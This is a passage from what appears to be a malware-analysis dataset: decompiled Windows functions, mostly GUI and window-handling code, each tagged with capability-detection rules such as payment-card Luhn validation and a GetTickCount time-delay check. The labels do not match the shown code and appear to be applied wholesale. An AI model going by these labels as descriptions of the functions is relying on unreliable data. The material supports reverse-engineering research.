        "decompiled_code": "\nvoid __fastcall fcn.004554dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x208) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x20c) + 0x1a);\n        fcn.0043d360(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.0043d38c();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.0043d360();\n        fcn.0043d38c();\n        if (iVar5 < 0) {\n            fcn.00454d54();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.0043d24c();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.0043d24c();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.0043d24c();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.0043d24c(iVar6, iVar7, iVar3);\n                fcn.00454d54();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.00454d54();\n        }\n        else {\n            iVar5 = fcn.0043d290();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.0043d290();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.0043d290();\n                }\n                fcn.0043d290();\n                fcn.00454d54();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 570
    },
    "00455890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455890(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x4558f1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.004433c0();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 221
    },
    "00455920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00455920(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x45593e;\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x455a84;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x455960;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x48481c + 0x14))();\n    uStack320 = 0x455a64;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x45597f;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xe0))();\n    puStack332 = 0x455987;\n    iVar2 = fcn.00403764();\n    if ((iVar2 != *0x452e64) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xbd) = *(stack0xfffffff8 + 0xbd) | 1;\n        uStack336 = 0x455a2c;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.0041c274();\n        if (cVar1 == '\\0') {\n            fcn.00403770();\n            var_10h = &fcn.00455920::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.00455920::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.0040675c();\n            fcn.0040c918(in_stack_fffffea4, arg_ch);\n            fcn.00403fc0();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xbd) = *(stack0xfffffff8 + 0xbd) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x455a6b;\n    uStack324 = 0x455a63;\n    (**(***0x48481c + 0x18))();\n    return;\n}\n",
        "token_count": 772
    },
    "004565c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004565c0(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00444620(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.00422d60(),  -1 < var_8h + -1)) {\n        do {\n            fcn.00422d34();\n            cVar1 = fcn.00403a28();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00459290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459290(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x2e4)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00459bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459bf0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x459c5c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xe4))();\n    if (cVar1 != '\\0') {\n        fcn.00403a28();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00459d24();\n        }\n    }\n    else {\n        in_EAX[0x93] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 202
    },
    "0045a78c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a78c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.00442ae0();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 67
    },
    "0045a9f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045a9f8(void)\n\n{\n    uint uStack20;\n    \n    fcn.0045aa60();\n    return uStack20;\n}\n",
        "token_count": 37
    },
    "0045aa10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0045aa10(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.0045aa60();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "0045aa2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045aa2c(void)\n\n{\n    uint uStack16;\n    \n    fcn.0045aa60();\n    return uStack16;\n}\n",
        "token_count": 36
    },
    "0045aa44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0045aa44(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.0045aa60();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 51
    },
    "0045aa60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045aa60(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x48444c)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 136
    },
    "0045aa90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045aa90(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x48444c)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 148
    },
    "0045b23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b23c(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint auStack24 [2];\n    \n    puVar5 = auStack24;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack24);\n            iVar1 = sub.user32.dll_WindowFromPoint(puVar5, auStack24[0]);\n            if (iVar1 != 0) {\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(iVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = fcn.0040760c();\n                    sub.user32.dll_SendMessageA(iVar1, 0x84, 0, uVar4);\n                    uVar4 = fcn.00407594();\n                    sub.user32.dll_SendMessageA(iVar1, 0x20, iVar1, uVar4);\n                    return;\n                }\n            }\n        }\n        uVar4 = fcn.0045b200();\n        sub.user32.dll_SetCursor(uVar4);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 357
    },
    "0045b450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __fastcall fcn.0045b450(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint var_1h;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        uVar1 = *(in_EAX + 0x44) < *(param_2 + 0x44);\n    }\n    else if (param_1 == '\\x02') {\n        uVar1 = *(param_2 + 0x44) + *(param_2 + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 < *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    }\n    else if (param_1 == '\\x03') {\n        uVar1 = *(in_EAX + 0x40) < *(param_2 + 0x40);\n    }\n    else if (param_1 == '\\x04') {\n        uVar1 = *(param_2 + 0x40) + *(param_2 + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 < *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    }\n    return uVar1;\n}\n",
        "token_count": 324
    },
    "0045b804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045b804(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x45b819;\n    cVar1 = fcn.0045b7ac(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.004037f0();\n        uStack28 = 0x45b87e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.0045b660(&stack0xfffffffc);\n        fcn.0045b660(&stack0xfffffffc);\n        fcn.0045b660(&stack0xfffffffc);\n        fcn.0045b660(&stack0xfffffffc);\n        fcn.0045b660(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x45b87d;\n        fcn.00403820();\n        return;\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0045c424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c424(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.0045cb70();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 134
    },
    "0045cec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045cec8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x109)) {\n        iVar1 = sub.user32.dll_GetCapture();\n        if (iVar1 == 0) {\n            iVar1 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar1 != *(*(in_EAX + 0x44) + 0x254))) {\n                while( true ) {\n                    iVar2 = fcn.0043a70c();\n                    if ((iVar2 != 0) || (iVar1 == 0)) break;\n                    iVar1 = sub.user32.dll_GetParent();\n                }\n                if (iVar1 == 0) {\n                    iVar1 = *param_2;\n                }\n            }\n            else {\n                iVar1 = fcn.0044407c();\n            }\n            iVar1 = sub.user32.dll_SendMessageA(iVar1, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        else {\n            iVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xfffffffa);\n            if (iVar2 == *0x485668) {\n                iVar1 = sub.user32.dll_SendMessageA(iVar1, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar1 != 0) {\n                    uVar3 = 1;\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 420
    },
    "0045d0b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045d0b8(void)\n\n{\n    char cVar1;\n    \n    do {\n        cVar1 = fcn.0045d020();\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 52
    },
    "0045d0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045d0d0(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0045d020();\n    if (cVar1 == '\\0') {\n        fcn.0045da60();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0045d404": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d404(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack128;\n    int32_t iStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    int32_t lpRect;\n    uint *var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t hWnd;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iStack104 = 0x45d41c;\n    var_4h = in_EAX;\n    iStack108 = sub.user32.dll_GetActiveWindow();\n    iStack104 = 2;\n    uStack112 = 0x45d42e;\n    hWnd = iStack108;\n    var_14h = (***0x484558)();\n    uStack112 = 2;\n    uStack116 = *(var_4h + 0x30);\n    puStack120 = 0x45d443;\n    var_18h = (***0x484558)();\n    if (var_14h != var_18h) {\n        var_44h = 0x28;\n        puStack120 = &fcn.0045d404::var_44h;\n        iStack124 = var_14h;\n        uStack128 = 0x45d466;\n        (***0x48444c)();\n        var_50h = &fcn.0045d404::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack104 = var_34h - var_3ch >> 1;\n        if (iStack104 < 0) {\n            iStack104 = iStack104 + ((var_34h - var_3ch & 1U) != 0);\n        }\n        iStack104 = iStack104 + var_3ch;\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        uStack112 = 0;\n        uStack116 = *(var_4h + 0x30);\n        puStack120 = 0x45d4ae;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack120 = 0x45d4b5;\n    var_10h = fcn.004540e0();\n    puStack120 = 0x45d4bd;\n    var_1ch = fcn.00453ff4();\n    puStack120 = 0x45d4c8;\n    cVar1 = fcn.0045c2f4();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack124 = 0x45d559;\n    uStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    uVar4 = *(var_4h + 0x30);\n    puStack120 = &stack0xfffffffc;\n    var_8h = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = uVar4;\n    if (var_14h != var_18h) {\n        iVar2 = var_48h - var_50h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_48h - var_50h & 1U) != 0);\n        }\n        iVar3 = var_4ch - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_4ch - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_50h, 0, 0, 0x1d, 0x45d560, arg_8h);\n    }\n    fcn.00454194();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.00454004();\n    return;\n}\n",
        "token_count": 1089
    },
    "0045df3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045df3c(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.0045de04();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.0045e274();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.0045df74();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "0045ecf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ecf0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45ed6d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004045c8();\n    if (0 < param_2) {\n        do {\n            cVar1 = fcn.0045e860();\n            if ((cVar1 != '\\x03') && (1 < cVar1 - 6U)) {\n                fcn.004047b0();\n                fcn.00404890();\n            }\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45ed74;\n    uStack32 = 0x45ed6c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 269
    },
    "0045efec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045efec(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_10h;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_8h = 0;\n    fcn.0040461c();\n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        var_14h = 1;\n        var_18h = iVar2;\n        do {\n            cVar1 = fcn.0045e860();\n            if (cVar1 - 1U < 2) {\n                var_10h = fcn.0045ed7c();\n                var_ch = fcn.00404888();\n                var_ch = var_ch + 1;\n                iVar4 = var_8h + 1;\n                iVar3 = fcn.00404888();\n                iVar2 = var_ch;\n                if (iVar4 <= iVar3) {\n                    var_1ch = (iVar3 - iVar4) + 1;\n                    do {\n                        cVar1 = fcn.0045ea30();\n                        iVar2 = iVar4;\n                        if (cVar1 == *(*arg_8h + -1 + iVar4)) break;\n                        iVar4 = iVar4 + 1;\n                        var_1ch = var_1ch + -1;\n                        iVar2 = var_ch;\n                    } while (var_1ch != 0);\n                }\n                var_ch = iVar2;\n                iVar2 = fcn.00404888();\n                if (iVar2 < var_ch) {\n                    fcn.0045ea30();\n                    fcn.004047b0();\n                    fcn.00404890();\n                }\n                arg_10h = var_10h - (var_8h + 1);\n                arg_8h_00 = &var_24h;\n                fcn.0045ee54(arg_8h_00, arg_10h & 0xffffff00 | var_1h, arg_10h, var_ch);\n                fcn.0040461c();\n                var_8h = var_10h;\n            }\n            var_14h = var_14h + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    fcn.00404888();\n    iVar2 = fcn.0045ed7c();\n    iVar3 = fcn.00404888();\n    if (iVar2 != iVar3) {\n        iVar3 = fcn.00404888();\n        fcn.0045ee54(&var_28h, iVar3 + 1U & 0xffffff00 | var_1h, iVar2 - var_8h, iVar3 + 1U);\n        fcn.0040461c();\n    }\n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        var_10h = 1;\n        var_18h = iVar2;\n        do {\n            if ((*(*arg_8h + -1 + var_10h) == ' ') && (cVar1 = fcn.0045ee2c(),  cVar1 == '\\0')) {\n                iVar2 = fcn.00404ae0();\n                *(iVar2 + -1 + var_10h) = var_1h;\n            }\n            var_10h = var_10h + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 991
    },
    "0045f268": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045f268(void)\n\n{\n    char cVar1;\n    \n    cVar1 = '\\v';\n    do {\n        fcn.00403820();\n        cVar1 = cVar1 + -1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 65
    },
    "0045fbdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fbdc(void)\n\n{\n    fcn.0045fba4();\n    return;\n}\n",
        "token_count": 26
    },
    "0045fe14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fe14(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.0045fbdc();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 4) = *(in_EAX + 4) + *(param_2 + 4);\n        *(in_EAX + 10) = *(in_EAX + 10) + *(param_2 + 6);\n        *(in_EAX + 8) = *(in_EAX + 8) + *(param_2 + 8);\n        *(in_EAX + 10) = *(in_EAX + 10) + *(param_2 + 10);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + *(param_2 + 0xc);\n        *(in_EAX + 0xe) = *(in_EAX + 0xe) + *(param_2 + 0xe);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + *(param_2 + 0x10);\n        fcn.0045fd50();\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0045ff00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0045ff00(void)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.004606b4();\n    return fVar1;\n}\n",
        "token_count": 41
    },
    "0045ff3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ff3c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    fcn.0046066c(arg_8h, arg_ch);\n    *(in_EAX + 4) = var_10h;\n    *(in_EAX + 8) = uStack16;\n    *(in_EAX + 0xc) = uStack12;\n    *(in_EAX + 0x10) = uStack8;\n    return;\n}\n",
        "token_count": 137
    },
    "0045ff68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045ff68(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.0046066c(arg_8h, arg_ch);\n    *(in_EAX + 4) = var_10h;\n    *(in_EAX + 8) = uStack16;\n    *(in_EAX + 0xc) = uStack12;\n    *(in_EAX + 0x10) = uStack8;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 233
    },
    "0045ffc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045ffc4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00460600();\n    fcn.004037f0();\n    *(in_EAX + 4) = var_10h;\n    *(in_EAX + 8) = uStack16;\n    *(in_EAX + 0xc) = uStack12;\n    *(in_EAX + 0x10) = uStack8;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack48;\n    }\n    return in_EAX;\n}\n",
        "token_count": 228
    },
    "0046001c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
